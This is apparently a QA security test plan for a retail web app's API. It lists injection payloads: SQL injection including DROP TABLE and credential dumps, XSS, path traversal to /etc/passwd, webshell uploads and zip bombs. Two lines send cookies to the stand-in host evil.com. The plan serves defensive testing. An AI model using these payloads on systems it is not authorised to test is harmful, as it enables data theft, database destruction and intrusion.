# 💉 Input Validation Hell Tests

## 1. SQL Injection Attacks

### TEST-INPUT-001: Search Bar SQL Injection
**Target**: All search fields (Products, Customers, Orders)
```
Payloads:
- ' OR '1'='1
- '; DROP TABLE products;--
- 1; SELECT * FROM auth_user;--
- ' UNION SELECT username,password FROM auth_user--
- ') OR ('1'='1

Fields to test:
- Product search: /api/products/?search=PAYLOAD
- Customer search: /api/customers/?search=PAYLOAD
- Order search: /api/orders/?search=PAYLOAD
- Global omni-search

Expected: Input sanitized, no SQL execution
Evil Expected: Data dump or database modification
```

### TEST-INPUT-002: Order By Injection
**Target**: Sortable columns
```
Payloads:
- name; DROP TABLE customers;--
- id,(SELECT password FROM auth_user LIMIT 1)
- CASE WHEN (1=1) THEN name ELSE id END

Request: GET /api/products/?ordering=PAYLOAD
Expected: Only allowed columns accepted
Evil Expected: Arbitrary SQL execution
```

---

## 2. XSS (Cross-Site Scripting)

### TEST-INPUT-003: Stored XSS in Product Name
**Goal**: Execute JavaScript for all users viewing product
```
Payloads:
- <script>alert('XSS')</script>
- <img src=x onerror=alert('XSS')>
- <svg onload=alert('XSS')>
- <iframe src="javascript:alert('XSS')">
- <body onload=alert('XSS')>
- "><script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>

Test in:
- Product name
- Product description (rich text!)
- Customer notes
- Order notes
- Category name
- Vendor name

Expected: HTML escaped/sanitized
Evil Expected: Script executes when page viewed
```

### TEST-INPUT-004: XSS in Receipt/PDF Generation
**Goal**: Inject script into generated receipts
```
Steps:
1. Create order with item: <script>alert('XSS')</script>
2. Generate receipt PDF
3. Open PDF in browser
Expected: Text displayed as-is
Evil Expected: PDF executes JavaScript (rare but possible)
```

### TEST-INPUT-005: DOM XSS via URL Parameters
**Goal**: Inject via URL
```
URLs to test:
- /products/?search=<script>alert(1)</script>
- /customers/#<img/src=x onerror=alert(1)>
- /orders/?status=<svg/onload=alert(1)>
- /dashboard?redirect=javascript:alert(1)

Expected: URL parameters sanitized
Evil Expected: XSS on page load
```

---

## 3. Path Traversal / LFI

### TEST-INPUT-006: Image Upload Path Traversal
**Goal**: Access system files via image path manipulation
```
Payloads for filename:
- ../../../etc/passwd
- ..\..\..\..\windows\system32\config\sam
- ....//....//....//etc/passwd
- product/../../../settings.py

Upload endpoint: POST /api/products/{id}/upload-image/
Expected: Filename sanitized, stored safely
Evil Expected: Access to server files
```

### TEST-INPUT-007: Receipt Template Inclusion
**Goal**: Include server files in receipt generation
```
Payloads in template fields:
- {% include '/etc/passwd' %}
- ${file:///etc/passwd}
- [[/etc/passwd]]

Expected: Template injection blocked
Evil Expected: Server files exposed
```

---

## 4. Numeric Overflow Attacks

### TEST-INPUT-008: Integer Overflow in Quantity
**Goal**: Cause arithmetic errors
```
Payloads for quantity fields:
- 2147483647 (MAX_INT)
- 2147483648 (MAX_INT + 1)
- -2147483648 (MIN_INT)
- 9999999999999999999999
- -1
- 0.000000001
- NaN
- Infinity

Fields:
- Order item quantity
- Stock quantity
- Stock adjustment

Expected: Validation rejects invalid values
Evil Expected: Calculation errors, negative totals, crashes
```

### TEST-INPUT-009: Price Manipulation
**Goal**: Get products for free or negative prices
```
Payloads for price fields:
- -100.00 (negative price)
- 0.00 (free item)
- 0.001 (rounds to zero?)
- 999999999.99 (overflow)
- 100,00 (European decimal)
- $100 (with symbol)
- 1e10 (scientific notation)

Expected: Proper validation
Evil Expected: Financial calculation errors
```

### TEST-INPUT-010: Discount Greater Than Price
**Goal**: Create negative order totals
```
Steps:
1. Add product worth ₹100
2. Apply item discount of ₹150
3. Check total calculation

Expected: Discount capped at item value
Evil Expected: Negative total → Credit to customer
```

---

## 5. Unicode & Encoding Attacks

### TEST-INPUT-011: Unicode Confusion
**Goal**: Bypass filters with look-alike characters
```
Payloads:
- Ꭺdmin (Cyrillic 'A')
- аdmin (Cyrillic 'а')
- ᴬᴰᴹᴵᴺ (Unicode superscript)
- admin‮ (Right-to-left override)
- admin\x00more (null byte injection)

Test in username, product names, search
Expected: Normalized or rejected
Evil Expected: Bypasses duplicate/username checks
```

### TEST-INPUT-012: Emoji Bomb
**Goal**: Crash with excessive unicode
```
Payloads:
- 🔥 (repeated 10000 times)
- 👨‍👩‍👧‍👦 (complex grapheme clusters x1000)
- ﷽ (long Arabic ligature x100)

Fields: Any text field
Expected: Length limit enforced properly
Evil Expected: Memory exhaustion, crash
```

### TEST-INPUT-013: Zero-Width Characters
**Goal**: Hide content or bypass validation
```
Payloads:
- admin​password (zero-width space between)
- product\u200Bname (zero-width space)
- ​​​​​​​​​​ (only zero-width chars)

Expected: Characters stripped or rejected
Evil Expected: Invisible differences cause issues
```

---

## 6. File Upload Hell

### TEST-INPUT-014: Malicious File Types
**Goal**: Upload executable files
```
Files to attempt:
- shell.php (PHP webshell)
- exploit.exe (executable)
- shell.php.jpg (double extension)
- shell.jpg.php (reversed)
- shell.PHP (case variation)
- shell.pHp5
- .htaccess (Apache config)

Expected: Only images allowed, verified by magic bytes
Evil Expected: Code execution on server
```

### TEST-INPUT-015: SVG XSS
**Goal**: Upload malicious SVG
```xml
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert('XSS')</script>
</svg>
```
Expected: SVG stripped of scripts or rejected
Evil Expected: XSS when SVG displayed

### TEST-INPUT-016: Zip Bomb
**Goal**: Crash server with decompression bomb
```
File: 42.zip (decompresses to petabytes)
Upload as: product_images.zip (if bulk upload exists)
Expected: File size/ratio limits
Evil Expected: Server disk/memory exhaustion
```

### TEST-INPUT-017: Giant File Upload
**Goal**: Exhaust disk space
```
Steps:
1. Generate 100GB file
2. Upload to product image endpoint
3. Repeat 100 times
Expected: File size limit enforced
Evil Expected: Disk full, server crash
```

---

## 🌐 BROWSER TEST SCENARIOS

### BROWSER-INPUT-001: Copy-Paste XSS
```javascript
// Copy this to clipboard and paste in any field:
// <script>fetch('http://evil.com?cookie='+document.cookie)</script>
Test: Does paste sanitize content?
```

### BROWSER-INPUT-002: Developer Tools Form Manipulation
```javascript
// In console, remove form validation:
document.querySelectorAll('input').forEach(i => {
  i.removeAttribute('maxlength');
  i.removeAttribute('min');
  i.removeAttribute('max');
  i.removeAttribute('required');
  i.removeAttribute('pattern');
});
// Then submit form with invalid data
```

### BROWSER-INPUT-003: Autocomplete Data Theft
```javascript
// Create form that tricks browser autocomplete
Test: Does app expose sensitive fields to autocomplete?
Check: Is autocomplete="off" set for passwords, credit cards?
```

---

## Test Execution Checklist

| Test ID | Status | Bug Found? | Severity |
|---------|--------|------------|----------|
| TEST-INPUT-001 | ⬜ | | |
| TEST-INPUT-002 | ⬜ | | |
| TEST-INPUT-003 | ⬜ | | |
| TEST-INPUT-004 | ⬜ | | |
| TEST-INPUT-005 | ⬜ | | |
| TEST-INPUT-006 | ⬜ | | |
| TEST-INPUT-007 | ⬜ | | |
| TEST-INPUT-008 | ⬜ | | |
| TEST-INPUT-009 | ⬜ | | |
| TEST-INPUT-010 | ⬜ | | |
| TEST-INPUT-011 | ⬜ | | |
| TEST-INPUT-012 | ⬜ | | |
| TEST-INPUT-013 | ⬜ | | |
| TEST-INPUT-014 | ⬜ | | |
| TEST-INPUT-015 | ⬜ | | |
| TEST-INPUT-016 | ⬜ | | |
| TEST-INPUT-017 | ⬜ | | |
